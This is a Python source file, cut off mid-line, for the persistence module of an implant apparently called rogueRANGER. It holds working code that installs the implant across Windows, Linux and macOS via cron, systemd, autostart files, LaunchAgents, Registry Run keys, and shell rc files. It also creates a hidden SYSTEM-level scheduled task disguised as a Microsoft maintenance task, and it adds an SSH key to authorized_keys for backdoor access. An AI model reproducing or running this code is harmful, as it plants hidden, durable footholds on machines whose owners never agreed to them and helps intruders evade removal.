#!/usr/bin/env python3
"""
Persistence Module for rogueRANGER
Layered persistence with "guzzling" capabilities
"""

import os
import sys
import time
import random
import shutil
import hashlib
import platform
import subprocess
import json
from typing import Dict, List, Optional, Tuple, Set
from pathlib import Path
import stat

class PersistenceEngine:
    """
    Advanced persistence engine with multiple layers
    Implements "guzzling" - actively seeking new footholds
    """
    
    def __init__(self, implant_path: str, debug: bool = False):
        self.implant_path = os.path.abspath(implant_path)
        self.implant_name = os.path.basename(implant_path)
        self.debug = debug
        self.system = platform.system().lower()
        
        # Platform detection
        self.is_windows = self.system == 'windows'
        self.is_linux = self.system == 'linux'
        self.is_macos = self.system == 'darwin'
        self.is_android = 'android' in platform.platform().lower()
        
        # Persistence methods registry
        self.methods = {
            'user_autostart': self._install_user_autostart,
            'cron_job': self._install_cron_job,
            'systemd_service': self._install_systemd_service,
            'registry_run': self._install_registry_run,
            'scheduled_task': self._install_scheduled_task,
            'login_hook': self._install_login_hook,
            'bashrc': self._install_bashrc,
            'ssh_authorized_keys': self._install_ssh_keys,
            'cloud_init': self._install_cloud_init,
            'container_persistence': self._install_container_persistence
        }
        
        # Installed persistence tracking
        self.installed_methods = set()
        self.persistence_locations = []
        
        # Guzzling configuration
        self.guzzling_enabled = True
        self.guzzling_interval = 3600  # 1 hour
        self.max_persistence_layers = 5
        
    def install_layered_persistence(self, layers: List[str] = None) -> Dict[str, bool]:
        """
        Install multiple persistence layers
        Returns: Dictionary of method -> success
        """
        if layers is None:
            # Default layers based on platform
            if self.is_windows:
                layers = ['registry_run', 'scheduled_task']
            elif self.is_linux:
                layers = ['cron_job', 'systemd_service', 'bashrc']
            elif self.is_macos:
                layers = ['login_hook', 'cron_job']
            else:
                layers = ['cron_job']
        
        results = {}
        
        for layer in layers:
            if layer in self.methods:
                try:
                    success = self.methods[layer]()
                    results[layer] = success
                    
                    if success:
                        self.installed_methods.add(layer)
                        if self.debug:
                            print(f"[PERSISTENCE] Installed layer: {layer}")
                except Exception as e:
                    results[layer] = False
                    if self.debug:
                        print(f"[PERSISTENCE] Failed layer {layer}: {e}")
        
        return results
    
    def _install_user_autostart(self) -> bool:
        """Install in user autostart directory"""
        try:
            if self.is_linux:
                autostart_dir = os.path.expanduser('~/.config/autostart')
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_file = os.path.join(autostart_dir, 'rogue.desktop')
                desktop_content = f"""[Desktop Entry]
Type=Application
Name=Rogue Service
Exec={self.implant_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
                
                with open(desktop_file, 'w') as f:
                    f.write(desktop_content)
                
                self.persistence_locations.append(desktop_file)
                return True
                
            elif self.is_macos:
                launch_agents = os.path.expanduser('~/Library/LaunchAgents')
                os.makedirs(launch_agents, exist_ok=True)
                
                plist_file = os.path.join(launch_agents, 'com.rogue.agent.plist')
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.rogue.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.implant_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
                
                with open(plist_file, 'w') as f:
                    f.write(plist_content)
                
                # Load the launch agent
                subprocess.run(['launchctl', 'load', plist_file], check=False)
                
                self.persistence_locations.append(plist_file)
                return True
                
        except Exception as e:
            if self.debug:
                print(f"[PERSISTENCE] Autostart failed: {e}")
            return False
        
        return False
    
    def _install_cron_job(self) -> bool:
        """Install cron job"""
        try:
            # Create a hidden cron entry
            cron_line = f"@reboot {self.implant_path} > /dev/null 2>&1 &\n"
            cron_line += f"*/5 * * * * {self.implant_path} --heartbeat > /dev/null 2>&1\n"
            
            if self.is_linux or self.is_macos:
                # Try user crontab first
                try:
                    result = subprocess.run(
                        ['crontab', '-l'],
                        capture_output=True,
                        text=True
                    )
                    
                    current_crontab = result.stdout if result.returncode == 0 else ""
                    
                    # Check if already installed
                    if self.implant_path not in current_crontab:
                        new_crontab = current_crontab + "\n" + cron_line
                        
                        # Write new crontab
                        import tempfile
                        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                            f.write(new_crontab)
                            temp_file = f.name
                        
                        subprocess.run(['crontab', temp_file], check=False)
                        os.unlink(temp_file)
                        
                        self.persistence_locations.append("crontab")
                        return True
                    else:
                        return True  # Already installed
                        
                except Exception as e:
                    if self.debug:
                        print(f"[PERSISTENCE] User crontab failed: {e}")
                    
                    # Try system cron as fallback
                    cron_file = '/etc/cron.d/rogue_service'
                    try:
                        with open(cron_file, 'w') as f:
                            f.write(cron_line)
                        
                        self.persistence_locations.append(cron_file)
                        return True
                    except:
                        return False
            
        except Exception as e:
            if self.debug:
                print(f"[PERSISTENCE] Cron job failed: {e}")
            return False
        
        return False
    
    def _install_systemd_service(self) -> bool:
        """Install systemd service (Linux only)"""
        if not self.is_linux:
            return False
        
        try:
            # Check if systemd is available
            result = subprocess.run(
                ['which', 'systemctl'],
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                return False
            
            # Create service file
            service_content = f"""[Unit]
Description=Rogue Background Service
After=network.target

[Service]
Type=simple
ExecStart={self.implant_path}
Restart=always
RestartSec=10
User={os.getlogin()}

[Install]
WantedBy=multi-user.target
"""
            
            # Try user systemd first
            user_systemd = os.path.expanduser('~/.config/systemd/user')
            os.makedirs(user_systemd, exist_ok=True)
            
            service_file = os.path.join(user_systemd, 'rogue.service')
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Enable and start the service
            subprocess.run(
                ['systemctl', '--user', 'enable', 'rogue.service'],
                check=False
            )
            subprocess.run(
                ['systemctl', '--user', 'start', 'rogue.service'],
                check=False
            )
            
            self.persistence_locations.append(service_file)
            return True
            
        except Exception as e:
            if self.debug:
                print(f"[PERSISTENCE] Systemd service failed: {e}")
            
            # Try global systemd as fallback
            try:
                service_file = '/etc/systemd/system/rogue.service'
                with open(service_file, 'w') as f:
                    f.write(service_content)
                
                subprocess.run(['systemctl', 'enable', 'rogue.service'], check=False)
                subprocess.run(['systemctl', 'start', 'rogue.service'], check=False)
                
                self.persistence_locations.append(service_file)
                return True
            except:
                return False
    
    def _install_registry_run(self) -> bool:
        """Install in Windows Registry Run key"""
        if not self.is_windows:
            return False
        
        try:
            import winreg
            
            # Current user run key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "RogueService", 0, winreg.REG_SZ, self.implant_path)
            
            self.persistence_locations.append("HKCU\\Run")
            return True
            
        except Exception as e:
            if self.debug:
                print(f"[PERSISTENCE] Registry Run failed: {e}")
            
            # Try local machine as fallback (requires admin)
            try:
                import winreg
                
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
                    winreg.SetValueEx(key, "RogueService", 0, winreg.REG_SZ, self.implant_path)
                
                self.persistence_locations.append("HKLM\\Run")
                return True
            except:
                return False
    
    def _install_scheduled_task(self) -> bool:
        """Install Windows Scheduled Task"""
        if not self.is_windows:
            return False
        
        try:
            # Create scheduled task XML
            task_name = "RogueMaintenance"
            task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>System maintenance task</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <CalendarTrigger>
      <StartBoundary>2026-03-18T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{self.implant_path}</Command>
    </Exec>
  </Actions>
</Task>"""
            
            # Save XML to temp file
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
                f.write(task_xml)
                xml_file = f.name
            
            # Create scheduled task
            subprocess.run(
                ['schtasks', '/Create', '/TN', task_name, '/XML', xml_file, '/F'],
                capture_output=True,
                shell=True
            )
            
            os.unlink(xml_file)
            self.persistence_locations.append(f"Scheduled Task: {task_name}")
            return True
            
        except Exception as e:
            if self.debug:
                print(f"[PERSISTENCE] Scheduled task failed: {e}")
            return False
    
    def _install_login_hook(self) -> bool:
        """Install login hook (macOS)"""
        if not self.is_macos:
            return False
        
        try:
            # Create login hook script
            hook_script = f"""#!/bin/bash
{sys.executable} {self.implant_path} &
"""
            
            hook_file = '/etc/rc.common'
            with open(hook_file, 'a') as f:
                f.write(f"\n{hook_script}")
            
            # Make executable
            os.chmod(hook_file, 0o755)
            
            self.persistence_locations.append(hook_file)
            return True
            
        except Exception as e:
            if self.debug:
                print(f"[PERSISTENCE] Login hook failed: {e}")
            return False
    
    def _install_bashrc(self) -> bool:
        """Install in .bashrc/.zshrc"""
        try:
            shell_rcs = [
                os.path.expanduser('~/.bashrc'),
                os.path.expanduser('~/.zshrc'),
                os.path.expanduser('~/.profile'),
                os.path.expanduser('~/.bash_profile')
            ]
            
            for rc_file in shell_rcs:
                if os.path.exists(rc_file):
                    # Check if already installed
                    with open(rc_file, 'r') as f:
                        content = f.read()
                    
                    if self.implant_path not in content:
                        # Add to rc file
                        with open(rc_file, 'a') as f:
                            f.write(f"\n# Rogue service\n")
                            f.write(f"nohup {self.implant_path} > /dev/null 2>&1 &\n")
                        
                        self.persistence_locations.append(rc_file)
            
            return len(self.persistence_locations) > 0
            
        except Exception as e:
            if self.debug:
                print(f"[PERSISTENCE] Bashrc failed: {e}")
            return False
    
    def _install_ssh_keys(self) -> bool:
        """Install SSH authorized keys for backdoor access"""
        try:
            ssh_dir = os.path.expanduser('~/.ssh')
            os.makedirs(ssh_dir, exist_ok=True)
            
            auth_keys = os.path.join(ssh_dir, 'authorized_keys')
            
            # Generate SSH key if needed
            key_file = os.path.join(ssh_dir, 'id_rsa_rogue')
            pub_key_file = key_file + '.pub'
            
            if not os.path.exists(key_file):
                # Generate new SSH key pair
                subprocess.run(
                    ['ssh-keygen', '-t', 'rsa', '-b', '4096', '-f', key_file, '-N', ''],
                    capture_output=True
                )
            
            # Read public key
            if os.path.exists(pub_key_file):
                with open(pub_key_file, 'r') as f:
                    pub_key = f.read().strip()
                
                # Add to authorized_keys
                with open(auth_keys, 'a') as f:
                    f.write(f"\n{pub_key}\n")
                
                self.persistence_locations.append(auth_keys)
                return True
            
            return False
            
        except Exception as e:
            if self.debug:
                print(f"[PERSISTENCE] SSH keys failed: {e}")
            return False
    
    def _install_cloud_init(self) -> bool:
        """Install cloud-init script for cloud instances"""
        try:
            cloud_init_dir = '/etc/cloud/cloud.cfg.d'
            if os.path.exists(cloud_init_dir):
                cloud_script = os.path.join(cloud_init_dir, '99-rogue.cfg')
                
                script_content = f"""#cloud-config
runcmd:
  - [{self.implant_path}]
"""
                
                with open(cloud_script, 'w') as f:
                    f.write(script_content)
                
                self.persistence_locations.append(cloud_script)
                return True
            
            return False
            
        except Exception as e:
            if self.debug:
                print(f"[PERSISTENCE] Cloud-init failed: {e}")
            return False
    
    def _install_container_persistence(self) -> bool:
        """Install persistence in container environments"""
        try:
            # Check if we're in a container
            container_indicators =